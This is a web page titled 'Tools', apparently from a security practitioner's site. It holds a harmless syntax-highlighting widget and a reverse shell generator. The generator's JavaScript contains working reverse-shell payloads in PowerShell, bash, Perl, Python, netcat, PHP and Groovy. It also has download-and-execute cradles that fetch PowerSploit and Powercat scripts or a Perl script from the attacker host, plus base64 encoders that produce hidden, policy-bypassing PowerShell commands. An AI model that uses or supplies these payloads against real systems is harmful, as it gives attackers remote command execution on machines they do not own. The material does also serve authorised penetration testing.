---
title: "Tools"
layout: "post"
---

## Syntax Highlighting

<link rel="stylesheet" href="/assets/highlight/styles/monokai-sublime.css">
<script src="/assets/highlight/highlight.pack.js"></script>
<script>

    var g_style_url = "/assets/highlight/styles/";

    hljs.initHighlightingOnLoad(); // Initialize highlight.js 
  
    function autoApplyLanguageStyle() {

        lg_saved = sessionStorage.getItem("language"); // Get the current language from the local session

        if (lg_saved != null) { 
            for (i=0; i < document.getElementById("select_language").length; i++) {
                if (document.getElementById("select_language")[i].value == lg_saved) {
                    document.getElementById("select_language")[i].selected = "true"; // Auto-select the value in the dropdown list 
                    break;
                }
            }
        }

        st_saved = sessionStorage.getItem("style"); // Get the current style from the local session

        if (st_saved != null) {
            for (i=0; i < document.getElementById("select_style").length; i++) {
                if (document.getElementById("select_style")[i].value == st_saved) {
                    document.getElementById("select_style")[i].selected = "true"; // Auto-select the value in the dropdown list 
                    break;
                }
            }
        }
    }

    function escapeHtml(unsafe) {

        return unsafe
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");

    }

    function updateStyle() {

        st = document.getElementById("select_style").value; // Get the select style 

        var links = document.getElementsByTagName("link");

        for (var i = links.length; i >= 0; i--) {

            if (links[i] && links[i].getAttribute("href") != null) {

                if (links[i].getAttribute("href").indexOf(g_style_url) != -1) {

                    var old_style_url = links[i].getAttribute("href")
                    var new_style_url = g_style_url + st + ".css"

                    if (old_style_url != new_style_url) {

                        var newlink = document.createElement("link");
                        newlink.setAttribute("rel", "stylesheet");
                        newlink.setAttribute("type", "text/css");
                        newlink.setAttribute("href", new_style_url);
                        links[i].parentNode.replaceChild(newlink, links[i])

                        sessionStorage.setItem("style", st); // Store selected style in the local session 
                    }
                }
            }
        }
    }
  
    function updateCode() {

        c = document.getElementById("textarea_src_code").value; // Get the source code to highlight
        lg = document.getElementById("select_language").value; // Get the selected language

        cr = document.getElementById("code_result"); // Get the preview element 
        cr.className = ""; // Remove any class that was previously added to this element 
        cr.classList.add("hljs"); // Add the default 'hljs" class to the element 
        cr.classList.add(lg); // Add the class corresponding to the selected language 

        sessionStorage.setItem("language", lg); // Store the selected language in the local session
                    
        document.getElementById("code_result").innerHTML = escapeHtml(c); // Copy the source code to the preview element 
        hljs.highlightBlock(document.getElementById("code_result")); // Syntax highlighting (highlight.js) 

    }

    function updateStyleAndCode() {
        updateStyle();
        updateCode();
    }
</script>

<div>
    <div name="code">
        <textarea id ="textarea_src_code" rows="8" spellcheck="false" style="width:100%" onchange="updateCode()">print("Hello World!")</textarea>
    </div>
    <div name="options">
    Language:
    <select id="select_language" style="width:200px" onchange="updateCode()">
        <option value="1c">1C</option>
        <option value="abnf">ABNF</option>
        <option value="accesslog">Access logs</option>
        <option value="ada">Ada</option>
        <option value="arm">ARM assembler</option>
        <option value="avrasm">AVR assembler</option>
        <option value="actionscript">ActionScript</option>
        <option value="apache">Apache</option>
        <option value="applescript">AppleScript</option>
        <option value="arcade">Arcade</option>
        <option value="asciidoc">AsciiDoc</option>
        <option value="aspectj">AspectJ</option>
        <option value="autohotkey">AutoHotkey</option>
        <option value="autoit">AutoIt</option>
        <option value="awk">Awk</option>
        <option value="axapta">Axapta</option>
        <option value="bash">Bash</option>
        <option value="basic">Basic</option>
        <option value="bnf">BNF</option>
        <option value="brainfuck">Brainfuck</option>
        <option value="csharp">C#</option>
        <option value="cpp">C++</option>
        <option value="cal">C/AL</option>
        <option value="cos">Cache Object Script</option>
        <option value="cmake">CMake</option>
        <option value="coq">Coq</option>
        <option value="csp">CSP</option>
        <option value="css">CSS</option>
        <option value="capnproto">Cap’n Proto</option>
        <option value="clojure">Clojure</option>
        <option value="coffeescript">CoffeeScript</option>
        <option value="crmsh">Crmsh</option>
        <option value="crystal">Crystal</option>
        <option value="dns">DNS Zone file</option>
        <option value="dos">DOS</option>
        <option value="dart">Dart</option>
        <option value="delphi">Delphi</option>
        <option value="diff">Diff</option>
        <option value="django">Django</option>
        <option value="dockerfile">Dockerfile</option>
        <option value="dsconfig">dsconfig</option>
        <option value="dts">DTS (Device Tree)</option>
        <option value="dust">Dust</option>
        <option value="elixir">Elixir</option>
        <option value="elm">Elm</option>
        <option value="erlang">Erlang</option>
        <option value="excel">Excel</option>
        <option value="fix">FIX</option>
        <option value="fortran">Fortran</option>
        <option value="gcode">G-Code</option>
        <option value="gams">Gams</option>
        <option value="gauss">GAUSS</option>
        <option value="gherkin">Gherkin</option>
        <option value="go">Go</option>
        <option value="golo">Golo</option>
        <option value="gradle">Gradle</option>
        <option value="groovy">Groovy</option>
        <option value=" XML">HTML</option>
        <option value="http">HTTP</option>
        <option value="haml">Haml</option>
        <option value="handlebars">Handlebars</option>
        <option value="haskell">Haskell</option>
        <option value="haxe">Haxe</option>
        <option value="hy">Hy</option>
        <option value=" TOML">Ini</option>
        <option value="inform7">Inform7</option>
        <option value="irpf90">IRPF90</option>
        <option value="json">JSON</option>
        <option value="java">Java</option>
        <option value="javascript">JavaScript</option>
        <option value="kotlin">Kotlin</option>
        <option value="leaf">Leaf</option>
        <option value="lasso">Lasso</option>
        <option value="less">Less</option>
        <option value="ldif">LDIF</option>
        <option value="lisp">Lisp</option>
        <option value="livecodeserver">LiveCode Server</option>
        <option value="livescript">LiveScript</option>
        <option value="lua">Lua</option>
        <option value="makefile">Makefile</option>
        <option value="markdown">Markdown</option>
        <option value="mathematica">Mathematica</option>
        <option value="matlab">Matlab</option>
        <option value="maxima">Maxima</option>
        <option value="mel">Maya Embedded Language</option>
        <option value="mercury">Mercury</option>
        <option value="mizar">Mizar</option>
        <option value="mojolicious">Mojolicious</option>
        <option value="monkey">Monkey</option>
        <option value="moonscript">Moonscript</option>
        <option value="n1ql">N1QL</option>
        <option value="nsis">NSIS</option>
        <option value="nginx">Nginx</option>
        <option value="nimrod">Nimrod</option>
        <option value="nix">Nix</option>
        <option value="ocaml">OCaml</option>
        <option value="objectivec">Objective C</option>
        <option value="glsl">OpenGL Shading Language</option>
        <option value="openscad">OpenSCAD</option>
        <option value="ruleslanguage">Oracle Rules Language</option>
        <option value="oxygene">Oxygene</option>
        <option value="pf">PF</option>
        <option value="php">PHP</option>
        <option value="parser3">Parser3</option>
        <option value="perl">Perl</option>
        <option value="plaintext">Plaintext</option>
        <option value="pony">Pony</option>
        <option value="pgsql">PostgreSQL & PL/pgSQL</option>
        <option value="powershell">PowerShell</option>
        <option value="processing">Processing</option>
        <option value="prolog">Prolog</option>
        <option value="properties">Properties</option>
        <option value="protobuf">Protocol Buffers</option>
        <option value="puppet">Puppet</option>
        <option value="python" selected>Python</option>
        <option value="profile">Python profiler results</option>
        <option value="k">Q</option>
        <option value="qml">QML</option>
        <option value="r">R</option>
        <option value="reasonml">ReasonML</option>
        <option value="rib">RenderMan RIB</option>
        <option value="rsl">RenderMan RSL</option>
        <option value="graph">Roboconf</option>
        <option value="ruby">Ruby</option>
        <option value="rust">Rust</option>
        <option value="sas">SAS</option>
        <option value="scss">SCSS</option>
        <option value="sql">SQL</option>
        <option value="p21">STEP Part 21</option>
        <option value="scala">Scala</option>
        <option value="scheme">Scheme</option>
        <option value="scilab">Scilab</option>
        <option value="shell">Shell</option>
        <option value="smali">Smali</option>
        <option value="smalltalk">Smalltalk</option>
        <option value="stan">Stan</option>
        <option value="stata">Stata</option>
        <option value="stylus">Stylus</option>
        <option value="subunit">SubUnit</option>
        <option value="swift">Swift</option>
        <option value="tcl">Tcl</option>
        <option value="tap">Test Anything Protocol</option>
        <option value="tex">TeX</option>
        <option value="thrift">Thrift</option>
        <option value="tp">TP</option>
        <option value="twig">Twig</option>
        <option value="typescript">TypeScript</option>
        <option value="vbnet">VB.Net</option>
        <option value="vbscript">VBScript</option>
        <option value="vhdl">VHDL</option>
        <option value="vala">Vala</option>
        <option value="verilog">Verilog</option>
        <option value="vim">Vim Script</option>
        <option value="x86asm">x86 Assembly</option>
        <option value="xl">XL</option>
        <option value="xquery">XQuery</option>
        <option value="yml">YAML</option>
        <option value="zephir">Zephir</option>
    </select>
    Style:
    <select id="select_style" style="width:200px" onchange="updateStyle()">
        <option value="a11y-dark">A11y Dark</option>
        <option value="a11y-light">A11y Light</option>
        <option value="agate">Agate</option>
        <option value="androidstudio">Androidstudio</option>
        <option value="an-old-hope">An Old Hope</option>
        <option value="arduino-light">Arduino Light</option>
        <option value="arta">Arta</option>
        <option value="ascetic">Ascetic</option>
        <option value="atelier-cave-dark">Atelier Cave Dark</option>
        <option value="atelier-cave-light">Atelier Cave Light</option>
        <option value="atelier-dune-dark">Atelier Dune Dark</option>
        <option value="atelier-dune-light">Atelier Dune Light</option>
        <option value="atelier-estuary-dark">Atelier Estuary Dark</option>
        <option value="atelier-estuary-light">Atelier Estuary Light</option>
        <option value="atelier-forest-dark">Atelier Forest Dark</option>
        <option value="atelier-forest-light">Atelier Forest Light</option>
        <option value="atelier-heath-dark">Atelier Heath Dark</option>
        <option value="atelier-heath-light">Atelier Heath Light</option>
        <option value="atelier-lakeside-dark">Atelier Lakeside Dark</option>
        <option value="atelier-lakeside-light">Atelier Lakeside Light</option>
        <option value="atelier-plateau-dark">Atelier Plateau Dark</option>
        <option value="atelier-plateau-light">Atelier Plateau Light</option>
        <option value="atelier-savanna-dark">Atelier Savanna Dark</option>
        <option value="atelier-savanna-light">Atelier Savanna Light</option>
        <option value="atelier-seaside-dark">Atelier Seaside Dark</option>
        <option value="atelier-seaside-light">Atelier Seaside Light</option>
        <option value="atelier-sulphurpool-dark">Atelier Sulphurpool Dark</option>
        <option value="atelier-sulphurpool-light">Atelier Sulphurpool Light</option>
        <option value="atom-one-dark">Atom One Dark</option>
        <option value="atom-one-dark-reasonable">Atom One Dark Reasonable</option>
        <option value="atom-one-light">Atom One Light</option>
        <option value="brown-paper">Brown Paper</option>
        <option value="codepen-embed">Codepen Embed</option>
        <option value="color-brewer">Color Brewer</option>
        <option value="darcula">Darcula</option>
        <option value="dark">Dark</option>
        <option value="darkula">Darkula</option>
        <option value="default">Default</option>
        <option value="docco">Docco</option>
        <option value="dracula">Dracula</option>
        <option value="far">Far</option>
        <option value="foundation">Foundation</option>
        <option value="github">Github</option>
        <option value="github-gist">Github Gist</option>
        <option value="gml">Gml</option>
        <option value="googlecode">Googlecode</option>
        <option value="gradient-dark">Gradient Dark</option>
        <option value="grayscale">Grayscale</option>
        <option value="gruvbox-dark">Gruvbox Dark</option>
        <option value="gruvbox-light">Gruvbox Light</option>
        <option value="hopscotch">Hopscotch</option>
        <option value="hybrid">Hybrid</option>
        <option value="idea">Idea</option>
        <option value="ir-black">Ir Black</option>
        <option value="isbl-editor-dark">Isbl Editor Dark</option>
        <option value="isbl-editor-light">Isbl Editor Light</option>
        <option value="kimbie.light">Kimbie Light</option>
        <option value="kimbie.dark">Kimbie Dark</option>
        <option value="lightfair">Lightfair</option>
        <option value="magula">Magula</option>
        <option value="mono-blue">Mono Blue</option>
        <option value="monokai">Monokai</option>
        <option value="monokai-sublime" selected>Monokai Sublime</option>
        <option value="night-owl">Night Owl</option>
        <option value="nord">Nord</option>
        <option value="obsidian">Obsidian</option>
        <option value="ocean">Ocean</option>
        <option value="paraiso-dark">Paraiso Dark</option>
        <option value="paraiso-light">Paraiso Light</option>
        <option value="pojoaque">Pojoaque</option>
        <option value="purebasic">Purebasic</option>
        <option value="qtcreator_dark">Qtcreator Dark</option>
        <option value="qtcreator_light">Qtcreator Light</option>
        <option value="railscasts">Railscasts</option>
        <option value="rainbow">Rainbow</option>
        <option value="routeros">Routeros</option>
        <option value="school-book">School Book</option>
        <option value="shades-of-purple">Shades Of Purple</option>
        <option value="solarized-dark">Solarized Dark</option>
        <option value="solarized-light">Solarized Light</option>
        <option value="sunburst">Sunburst</option>
        <option value="tomorrow">Tomorrow</option>
        <option value="tomorrow-night-blue">Tomorrow Night Blue</option>
        <option value="tomorrow-night-bright">Tomorrow Night Bright</option>
        <option value="tomorrow-night">Tomorrow Night</option>
        <option value="tomorrow-night-eighties">Tomorrow Night Eighties</option>
        <option value="vs2015">Vs2015</option>
        <option value="vs">Vs</option>
        <option value="xcode">Xcode</option>
        <option value="xt256">Xt256</option>
        <option value="zenburn">Zenburn</option>
    </select>
    <!--<button name="btn_highlight" style="width:150px" onclick="javascript:updateStyleAndCode()">Highlight!</button>-->
    </div>
    <div style="overflow:auto">
        <pre id="code_result"></pre>
    </div>
</div>
<script>
    autoApplyLanguageStyle();
    updateStyleAndCode();
</script>

---

## Reverse Shell Generator

<script>

    function encodeBash(payload) {
        return "bash -c \"{echo," + btoa(payload) + "}|{base64,-d}|{bash,-i}\"";
    }

    function encodePowerShell(payload) {

        // Convert payload string to byte array
        var array = new Uint8Array(payload.length*2);
        for (var i=0; i<array.length; i++) {
            if (i % 2 == 0) {
                array[i] = payload[i/2].charCodeAt(0);
            } else {
                array[i] = 0;
            }
        }

        // Convert byte array to binary string
        var bstr = "";
        for (var i=0; i<array.length; i++) {
            bstr += String.fromCharCode(array[i]);
        }

        // Convert binary string to base64 and create command line
        var result = "powershell -nop -noni -w Hidden -ep Bypass -e " + btoa(bstr);

        return result;
    }

    function updateOutput(eltName, eltValue, eltClass) {

        elt = document.getElementById(eltName);
        elt.className = "";
        elt.classList.add("hljs");
        elt.classList.add(eltClass);
        elt.innerHTML = escapeHtml(eltValue);
        hljs.highlightBlock(elt);

    }

    function updateCommandOutput() {

        var sl = document.getElementById("rs_select_language").value;
        var lhost = document.getElementById("rs_lhost").value;
        var lport = document.getElementById("rs_lport").value;

        if (sl != "" && sessionStorage.getItem("rs_select_language") != sl) {
            sessionStorage.setItem("rs_select_language", sl);
        }

        if (lhost != "" && sessionStorage.getItem("rs_lhost") != lhost) {
            sessionStorage.setItem("rs_lhost", lhost);
        }
        
        if (lport != "" && sessionStorage.getItem("rs_lport") != lport) {
            sessionStorage.setItem("rs_lport", lport);
        }

        var res_raw = "";
        var res_oneliner = "";
        var res_encoded = "";
        var res_raw_hljs = "";
        var res_oneliner_hljs = "";
        var res_encoded_hljs = "";

        if (sl == "psh") {
            res_raw_hljs = "powershell";
            res_oneliner_hljs = "powershell";
            res_encoded_hljs = "powershell";
            res_encoded_hljs = "powershell";
            res_raw = "$c=New-Object Net.Sockets.TCPClient(\"" + lhost + "\"," + lport + ");\n$s=$c.GetStream();\n[byte[]]$b=0..65535|%{0};\nwhile(($i=$s.Read($b, 0, $b.Length)) -ne 0)\n{\n\t$d=(New-Object -t Text.ASCIIEncoding).GetString($b,0,$i-1);\n\tif($d -eq \"exit\"){break}\n\t$sb=if($i -gt 1) {try {iex \"$d 2>&1\" | Out-String} catch {$_ | Out-string}} else{\"\"};\n\t$sb2=$sb+\"PS \"+(pwd).Path+\"> \";\n\t$sdb=([text.encoding]::ASCII).GetBytes($sb2)\n\t$s.Write($sdb,0,$sdb.Length);\n\t$s.Flush()\n};\n$c.Close()";
            res_oneliner = "# No one-liner for this payload";
            res_encoded = encodePowerShell(res_raw);
        } else if (sl == "psh_ssl") {
            res_raw_hljs = "powershell";
            res_oneliner_hljs = "powershell";
            res_encoded_hljs = "powershell";
            res_raw = "$c=New-Object Net.Sockets.TcpClient(\"" + lhost + "\"," + lport + ")\n$s=$c.GetStream()\n$ss=New-Object Net.Security.SslStream($s,$False,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$ss.AuthenticateAsClient(\"foo.tld\",$Null,\"Tls12\",$False)\n$w=New-Object IO.StreamWriter($ss)\n$w.Write(\"PS \"+(pwd).Path+\"> \")\n$w.Flush()\n[byte[]]$b=0..65535|%{0}\nwhile(($i=$ss.Read($b,0,$b.Length)) -ne 0){\n    $d=(New-Object -TypeName Text.UTF8Encoding).GetString($b,0,$i)\n    $sb=(iex $d | Out-String) 2>&1\n    $sb2=$sb+\"PS \"+(pwd).Path+\"> \"\n    $sb=([Text.Encoding]::UTF8).GetBytes($sb2)\n    $ss.Write($sb,0,$sb.Length)\n    $ss.Flush()\n}\n$c.Close()"
            res_oneliner = "# No one-liner for this payload";
            res_encoded = encodePowerShell(res_raw);
        } else if (sl == "psh_powersploit") {
            res_raw_hljs = "powershell";
            res_oneliner_hljs = "powershell";
            res_encoded_hljs = "powershell";
            res_encoded_hljs = "powershell";
            res_raw = "IEX (New-Object System.Net.WebClient).DownloadString('http://" + lhost + "/tools/Invoke-PowerShellTcp.ps1');\nInvoke-powershellTcp -Reverse -IPAddress " + lhost + " -Port " + lport;
            res_oneliner = "powershell -nop -noni -w Hidden -ep Bypass -c \"" + res_raw.replace(/\n/g, "") + "\"";
            res_encoded = encodePowerShell(res_raw);
        } else if (sl == "psh_powercat") { 
            res_raw_hljs = "powershell";
            res_oneliner_hljs = "powershell";
            res_encoded_hljs = "powershell";
            res_encoded_hljs = "bash";
            res_raw = "IEX (New-Object System.Net.WebClient).DownloadString('http://" + lhost + "/tools/powercat.ps1');\npowercat -c " + lhost + " -p " + lport + " -e cmd";
            res_oneliner = "powershell -nop -noni -w Hidden -ep Bypass -c \"" + res_raw.replace(/\n/g, "") + "\"";;
            res_encoded = encodePowerShell(res_raw);
        } else if (sl == "bash") { 
            res_raw_hljs = "bash";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1";
            res_oneliner = "bash -c \"" + res_raw + "\"";
            res_encoded = encodeBash(res_raw);
        } else if (sl == "bash_mkfifo") { 
            res_raw_hljs = "bash";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "rm /tmp/f;\nmkfifo /tmp/f;\ncat /tmp/f|/bin/sh -i 2>&1|nc " + lhost + " " + lport + " >/tmp/f";
            res_oneliner = res_raw.replace(/\n/g, "");
            res_encoded = encodeBash(res_raw);
        } else if (sl == "perl") { 
            res_raw_hljs = "perl";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "use Socket;\n$i=\"" + lhost + "\";\n$p=" + lport + ";\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\n\topen(STDIN,\">&S\");\n\topen(STDOUT,\">&S\");\n\topen(STDERR,\">&S\");\n\texec(\"/bin/sh -i\");\n};";
            res_oneliner = "perl -e '" + res_raw.replace(/\t/g, "").replace(/\n/g, "") + "'";
            res_encoded = "perl -MMIME::Base64 -e \"eval(decode_base64('" + btoa(res_raw) + "'))\"";
        } else if (sl == "perl_web") { 
            res_raw_hljs = "perl";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "curl http://" + lhost + "/rev.pl -o /tmp/rev.pl ; perl /tmp/rev.pl";
            res_oneliner = res_raw;
            res_encoded = encodeBash(res_raw);
        } else if (sl == "python") { 
            res_raw_hljs = "python";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "import socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect((\"" + lhost + "\"," + lport + "));\nos.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\np=subprocess.call([\"/bin/sh\",\"-i\"]);";
            res_oneliner = "python -c '" + res_raw.replace(/\n/g, "") + "'";
            res_encoded = "python -c \"exec('" + btoa(res_raw) + "'.decode('base64'))\"";
        } else if (sl == "netcat") { 
            res_raw_hljs = "bash";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "nc -e /bin/sh " + lhost + " " + lport;
            res_oneliner = res_raw;
            res_encoded = encodeBash(res_raw);
        } else if (sl == "php") { 
            res_raw_hljs = "php";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "$sock=fsockopen(\"" + lhost + "\"," + lport + ");\nexec(\"/bin/sh -i <&3 >&3 2>&3\");";
            res_oneliner = "php -r '" + res_raw.replace(/\n/g, "") + "'";
            res_encoded = encodeBash(res_oneliner);
        } else if (sl == "groovy") { 
            res_raw_hljs = "groovy";
            res_oneliner_hljs = "bash";
            res_encoded_hljs = "bash";
            res_raw = "String host=\"10.10.10.10\";\nint port=1337;\nString cmd=\"/bin/sh\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){\n\twhile(pi.available()>0)so.write(pi.read());\n\twhile(pe.available()>0)so.write(pe.read());\n\twhile(si.available()>0)po.write(si.read());\n\tso.flush();\n\tpo.flush();\n\tThread.sleep(50);\n\ttry {\n\t\tp.exitValue();\n\t\tbreak;\n\t} catch (Exception e){}\n};\np.destroy();\ns.close();";
            res_oneliner = "# No one-liner for this payload";
            res_encoded = "# No encoder for this payload";
        }

        updateOutput("rs_result_raw", res_raw, res_raw_hljs);
        updateOutput("rs_result_oneliner", res_oneliner, res_oneliner_hljs);
        updateOutput("rs_result_encoded", res_encoded, res_encoded_hljs);
    }
</script>
<div>
    LHOST: 
    <input name="rs_lhost" id="rs_lhost" style="width:150px" onchange="updateCommandOutput()"/>
    LPORT:
    <input name="rs_lport" id="rs_lport" style="width:75px" onchange="updateCommandOutput()"/>
    Language:
    <select id="rs_select_language" style="width:200px" onchange="updateCommandOutput()">
        <option value="psh">PowerShell</option>
        <option value="psh_ssl">PowerShell (SSL/TLS)</option>
        <option value="psh_powersploit">PowerShell (PowerSploit)</option>
        <option value="psh_powercat">PowerShell (Powercat)</option>
        <option value="bash">Bash</option>
        <option value="bash_mkfifo">Bash (mkfifo)</option>
        <option value="perl">Perl</option>
        <option value="perl_web">Perl (web server)</option>
        <option value="python">Python</option>
        <option value="netcat">Netcat</option>
        <option value="php">PHP</option>
        <option value="groovy">Groovy</option>
    </select>
</div>

#### One-liner

<pre id="rs_result_oneliner"></pre>


#### Encoded

<pre id="rs_result_encoded"></pre>

#### Raw

<pre id="rs_result_raw"></pre>

<script>
    
    if (sessionStorage.getItem("rs_select_language") != null) {
        for (i=0; i < document.getElementById("rs_select_language").length; i++) {
            if (document.getElementById("rs_select_language")[i].value == sessionStorage.getItem("rs_select_language")) {
                document.getElementById("rs_select_language")[i].selected = "true"; 
                break;
            }
        }
    }

    if (sessionStorage.getItem("rs_lhost") != null) {
        document.getElementById("rs_lhost").value = sessionStorage.getItem("rs_lhost");
    } else {
        document.getElementById("rs_lhost").value = "10.10.13.37";
    }
    
    if (sessionStorage.getItem("rs_lport") != null) {
        document.getElementById("rs_lport").value = sessionStorage.getItem("rs_lport");
    } else {
        document.getElementById("rs_lport").value = "1337";
    }

    updateCommandOutput();

</script>
